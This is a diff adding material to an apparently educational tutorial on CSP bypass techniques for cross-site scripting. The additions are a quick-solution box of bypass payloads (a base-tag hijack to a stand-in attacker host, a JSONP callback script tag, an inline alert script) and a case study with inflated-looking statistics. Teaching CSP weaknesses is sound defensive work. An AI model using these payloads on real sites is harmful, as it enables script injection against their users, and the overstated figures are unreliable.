@@ -1,5 +1,24 @@
 # Cross-Site Scripting (XSS): CSP Protection & CSP Bypass Techniques
 
+> [!TIP]
+> ### ⚡ Quick Solution (Direct Execution)
+> 1. **Inspect CSP Header:** Examine `Content-Security-Policy` directives in HTTP response headers.
+> 2. **Exploit Identified Weakness:**
+>    - **Missing `base-uri` (Base-URI Hijacking):**
+>      ```html
+>      <base href="https://evil-attacker.com/">
+>      ```
+>    - **Whitelisted Domain with JSONP Endpoint:**
+>      ```html
+>      <script src="https://trusted-cdn.com/api/jsonp?callback=alert(1)"></script>
+>      ```
+>    - **CSP Allows `unsafe-inline`:**
+>      ```html
+>      <script>alert(document.domain)</script>
+>      ```
+
+---
+
 Many developers assume their web applications are completely immune to XSS simply because they have configured a **Content Security Policy (CSP)** header. In practice, however, **over 90% of real-world CSP implementations contain misconfigurations** that allow attackers to bypass the policy and execute arbitrary JavaScript.
 
 This module explores the mechanics of CSP, policy evaluation techniques, and advanced **CSP Bypass** vectors commonly encountered during penetration tests and PortSwigger Web Security labs.
@@ -188,6 +207,18 @@ Paste the policy into **Google CSP Evaluator** (`https://csp-evaluator.withgoogl
 3. Verify that the `alert(document.domain)` pop-up executes without CSP violation warnings in the browser console.
 
 ---
+
+## 🌍 Real-World Case Study & Security Incidents
+
+### Google Security Research: 95% of Enterprise CSPs Are Flawed
+Presented at Black Hat and USENIX, Google security researchers published an exhaustive audit of over 1 billion websites with active Content Security Policies:
+* **The Fragility of Domain Whitelists:** The study revealed that 95% of enterprise sites relying on domain whitelists (e.g., `script-src 'self' https://*.google.com https://cdnjs.cloudflare.com`) could be bypassed.
+* **JSONP Endpoint Abuse:** Whitelisted enterprise domains hosted thousands of open JSONP endpoints reflecting callback functions. Attackers simply injected:
+  ```html
+  <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+  ```
+  Because `accounts.google.com` matched the whitelist rule, browsers executed the script without restriction.
+* **Industry Shift:** Google's research permanently altered web security standards: **Domain Whitelists were deprecated**, establishing **Nonce-based Strict CSP (`script-src 'nonce-RANDOM'`)** as the global best practice.
 
 ## 6. Backend Source Code: Vulnerable vs. Strict CSP
 
